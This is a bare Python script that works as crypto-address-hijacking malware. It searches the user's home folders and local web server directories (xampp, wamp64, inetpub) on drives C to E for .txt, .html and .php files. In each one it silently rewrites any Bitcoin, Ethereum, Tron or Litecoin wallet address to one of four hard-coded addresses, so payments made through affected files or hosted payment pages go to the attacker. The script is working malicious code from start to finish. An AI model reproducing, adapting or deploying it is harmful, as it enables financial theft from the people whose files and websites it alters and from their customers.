import os
import getpass
import re
import ctypes
replacement_addresses = {'btc': '1AtEoX9gmTZCw2YRP5JRgTSagdLPYcDrQC', 'eth': '0xc7992e3da7cb1824ce346cb9bc59771163a1dddc', 'trx': 'TWurEPAhaeyKWwax5x8CoX37gHtWAfvNAa', 'ltc': 'LTLqT6vMBwxUAXPH9ResjofPjijJAUsCYA'}
address_patterns = {'btc': '\\b(?:[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{39,59})\\b', 'eth': '\\b0x[a-fA-F0-9]{40}\\b', 'trx': '\\bT[a-zA-Z0-9]{33}\\b', 'ltc': '\\b(?:[LM3][a-km-zA-HJ-NP-Z1-9]{26,33})\\b'}

def search_and_replace(file_path):
    encodings = ['utf-8', 'latin-1', 'cp1252']
    for encoding in encodings:
        try:
            with open(file_path, 'r', encoding=encoding) as file:
                content = file.read()
            original_content = content
            for key, pattern in address_patterns.items():
                content = re.sub(pattern, replacement_addresses[key], content)
            if content != original_content:
                with open(file_path, 'w', encoding=encoding) as file:
                    file.write(content)
            break
        except (UnicodeDecodeError, IOError):
            continue

def process_directory(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(('.txt', '.html', '.php')):
                file_path = os.path.join(root, file)
                search_and_replace(file_path)

def main():
    username = getpass.getuser()
    directories_to_process = [f'C:\\Users\\{username}\\Desktop', f'C:\\Users\\{username}\\Documents', f'C:\\Users\\{username}\\Pictures', f'C:\\Users\\{username}\\Music', f'C:\\Users\\{username}\\Videos', f'C:\\Users\\{username}\\Downloads', f'C:\\xampp', 'C:\\wamp64', 'C:\\inetpub', f'D:\\Users\\{username}\\Desktop', f'D:\\Users\\{username}\\Documents', f'D:\\Users\\{username}\\Videos', f'D:\\Users\\{username}\\Downloads', f'D:\\xampp', 'D:\\wamp64', 'D:\\inetpub', f'E:\\Users\\{username}\\Desktop', f'E:\\Users\\{username}\\Documents', f'E:\\Users\\{username}\\Music', f'E:\\Users\\{username}\\Videos', f'E:\\Users\\{username}\\Downloads', 'E:\\xampp', 'E:\\wamp64', 'E:\\inetpub']
    for directory in directories_to_process:
        if os.path.exists(directory):
            process_directory(directory)
if __name__ == '__main__':
    main()
